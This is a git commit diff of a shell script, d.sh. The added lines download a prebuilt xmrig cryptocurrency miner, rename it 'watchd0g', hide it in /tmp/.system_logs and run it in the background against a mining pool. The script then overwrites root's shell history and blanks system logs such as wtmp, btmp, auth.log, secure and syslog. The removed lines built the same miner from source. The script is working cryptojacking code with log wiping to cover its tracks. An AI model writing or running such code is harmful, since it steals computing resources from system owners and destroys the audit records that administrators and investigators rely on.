5c802f02a3e5ca5b28abb6fac8f73bb71899d0f2
momika233 <56291820+momika233@users.noreply.github.com>
2024-12-28 15:46:17 +0800

    Update d.sh

--- d.sh
+++ d.sh
@@ -1,20 +1,9 @@
 #!/bin/bash
 
+mkdir /tmp/.system_logs
 
-#!/bin/bash
+wget https://github.com/momika233/xmrig/files/15147153/momika233-2024-04-29-xmrig.zip && unzip momika233-2024-04-29-xmrig.zip && mv xmrig watchd0g && rm -rf momika233-2024-04-29-xmrig.zip
 
-sudo apt update
-sudo apt upgrade
-
-apt install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget unzip -y
-
-
-cd /tmp/ && git clone https://github.com/momika233/xmrig.git && cd xmrig/scripts
-bash ./build_deps.sh && cd ../build
-cmake .. -DXMRIG_DEPS=scripts/deps
-make -j$(nproc)
-
-mkdir /tmp/.system_logs && mv xmrig /tmp/.system_logs/watchd0g && cd /tmp/.system_logs && rm -rf /tmp/xmrig && chmod 777 /tmp/.system_logs/watchd0g && cd /tmp/.system_logs/ && ./watchd0g -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u 1668078498 -p x -B
-
+chmod 777 /tmp/.system_logs/watchd0g && cd /tmp/.system_logs && ./watchd0g -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u 1668078498 -p x -B && echo "exit" > /root/.zsh_history
 
 echo > /var/log/wtmp && echo > /var/log/btmp && echo>/var/log/lastlog && echo > /var/log/secure && echo > /var/log/messages && echo>/var/log/syslog && echo>/var/log/xferlog && echo>/var/log/auth.log && echo>/var/log/user.log && cat /dev/null > /var/adm/sylog && cat /dev/null > /var/log/maillog && cat /dev/null > /var/log/openwebmail.log && cat /dev/null > /var/log/mail.info && echo>/var/run/utmp && cd  /root/ && echo > .bash_history && history -c
